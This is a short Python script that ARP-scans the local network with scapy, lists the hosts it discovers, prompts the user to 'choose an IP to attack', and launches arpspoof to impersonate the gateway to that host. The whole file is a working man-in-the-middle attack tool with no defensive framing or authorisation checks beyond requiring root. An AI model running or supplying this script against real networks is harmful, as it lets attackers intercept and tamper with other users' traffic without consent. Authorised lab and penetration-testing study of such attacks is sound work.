#!/usr/bin/env python3
# coding=utf-8

import subprocess
import re
import os
from scapy.all import ARP, Ether, srp
import time

def get_network_info():
    cmd = "ip route show"
    output = subprocess.check_output(cmd, shell=True).decode()
    
    gateway = re.search(r'default via (\S+)', output).group(1)
    iface = re.search(r'dev (\S+)', output).group(1) 
    network = re.search(r'(\d+\.\d+\.\d+\.\d+)/\d+', output).group(1) 

    return network, iface, gateway

def scan_network(network):
    print(f"🔍 Scanning network: {network}/24 ...")
    
    arp_request = ARP(pdst=f"{network}/24")
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    
    result = srp(packet, timeout=2, verbose=False)[0]

    devices = []
    for sent, received in result:
        devices.append({"ip": received.psrc, "mac": received.hwsrc})
    
    return devices

def arp_spoof(target_ip, gateway_ip, iface):
    print(f"⚠️ Starting ARP Spoof Attack on {target_ip}")
    
    if os.geteuid() != 0:
        print("This script requires sudo/root privileges.")
        return
    
    cmd = f"arpspoof -i {iface} -t {target_ip} {gateway_ip}"
    subprocess.Popen(cmd, shell=True)

def main():
    network, iface, gateway = get_network_info()
    devices = scan_network(network)

    print("\n📋 Found Devices:")
    for i, device in enumerate(devices):
        print(f"{i}: {device['ip']} ({device['mac']})")
    
    if not devices:
        print("No devices found.")
        return

    try:
        choice = int(input("🎯 Choose an IP to attack: "))
        target_ip = devices[choice]['ip']
        arp_spoof(target_ip, gateway, iface)
    except (IndexError, ValueError):
        print("Invalid selection.")

if __name__ == "__main__":
    main()
